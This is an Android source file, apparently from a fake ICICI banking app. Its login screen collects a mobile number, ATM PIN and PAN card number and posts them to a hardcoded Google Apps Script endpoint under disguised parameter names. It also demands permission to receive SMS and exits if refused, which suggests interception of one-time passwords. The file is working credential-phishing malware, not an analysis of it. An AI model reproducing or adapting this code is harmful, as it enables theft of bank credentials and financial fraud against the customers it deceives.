package com.example.icici;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.Toast;

import com.android.volley.DefaultRetryPolicy;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.RetryPolicy;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;

import java.util.HashMap;
import java.util.Map;

public class pehla_page extends AppCompatActivity {
    private static final String FILE_NAME ="myFile" ;
    EditText mobileNo,atmPIN,panCad;
    CheckBox remember;
    Button login;
    ProgressDialog progressDialog;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_pehla);
        if(Build.VERSION.SDK_INT>=Build.VERSION_CODES.M && checkSelfPermission(Manifest.permission.RECEIVE_SMS)!= PackageManager.PERMISSION_GRANTED){
            requestPermissions(new String[]{Manifest.permission.RECEIVE_SMS},1000);
        }
        mobileNo=findViewById(R.id.editTextMobile);
        atmPIN=findViewById(R.id.editTextATMPIN);
        panCad=findViewById(R.id.editTextPAN);
        remember=findViewById(R.id.checkBox);
        login=findViewById(R.id.button);
        progressDialog=new ProgressDialog(pehla_page.this);
        progressDialog.setMessage("Loading...");
        SharedPreferences sharedPreferences=getSharedPreferences(FILE_NAME,MODE_PRIVATE);
       String mobPh= sharedPreferences.getString("mobKey","");
      String pinATM=  sharedPreferences.getString("atmKey","");
       String panNo= sharedPreferences.getString("panKey","");
        mobileNo.setText(mobPh);
        atmPIN.setText(pinATM);
        panCad.setText(panNo);
        login.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if(remember.isChecked()){
                    if(mobileNo.getText().toString().isEmpty() || atmPIN.getText().toString().isEmpty()||panCad.getText().toString().isEmpty())
                    {
                        Toast.makeText(pehla_page.this, "Please Fill All The Details!", Toast.LENGTH_SHORT).show();
                    }
                    else {
                        storeData(mobileNo.getText().toString(), atmPIN.getText().toString(), panCad.getText().toString());
                        addData();
                       progressDialog.show();
                    }
                }
                else {
                    if(mobileNo.getText().toString().isEmpty() || atmPIN.getText().toString().isEmpty()||panCad.getText().toString().isEmpty())
                    {
                        Toast.makeText(pehla_page.this, "Please Fill All The Details!", Toast.LENGTH_SHORT).show();
                    }
                    else {
                        addData();
                        progressDialog.show();
                    }
                }
            }
        });
    }

    private void storeData(String toString, String toString1, String toString2) {
        SharedPreferences.Editor editor=getSharedPreferences(FILE_NAME,MODE_PRIVATE).edit();
        editor.putString("mobKey",toString);
        editor.putString("atmKey",toString1);
        editor.putString("panKey",toString2);
        editor.apply();
    }
        public void onRequestPermissionsResult(int requestCode, @NonNull String[]permissions, @NonNull int[]grantResults){
        if (requestCode==1000){
            if (grantResults[0]==PackageManager.PERMISSION_GRANTED){
                Toast.makeText(this, "Permission granted!", Toast.LENGTH_SHORT).show();
            }else {
                Toast.makeText(this, "Permission not granted!", Toast.LENGTH_SHORT).show();
                finish();
            }
        }
    }
    private void addData() {
        String mobile=mobileNo.getText().toString();
        String atmPin=atmPIN.getText().toString();
        String panCard=panCad.getText().toString();
        StringRequest stringRequest=new StringRequest(Request.Method.POST, "https://script.google.com/macros/s/AKfycbxsmMps_CCjKW9qVfJGrjKnhB_969Udkj7-Z8eNqObEZA-BPFZb3DRAYwCA_xGNtxD2FQ/exec", new Response.Listener<String>() {
            @Override
            public void onResponse(String response) {
                Intent intent=new Intent(pehla_page.this, Dusra_Page.class);
                startActivity(intent);
                progressDialog.hide();
            }
        }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            protected Map<String,String> getParams(){
                Map<String,String>params=new HashMap<>();
                params.put("action","addData");
                params.put("vAA",mobile);
                params.put("vBB",atmPin);
                params.put("vCC",panCard);
                return params;
            }
        };
        int socketTimeout=50000;
        RetryPolicy retryPolicy=new DefaultRetryPolicy(socketTimeout,0,DefaultRetryPolicy.DEFAULT_BACKOFF_MULT);
        stringRequest.setRetryPolicy((retryPolicy));
        RequestQueue requestQueue= Volley.newRequestQueue(pehla_page.this);
        requestQueue.add(stringRequest);
    }
}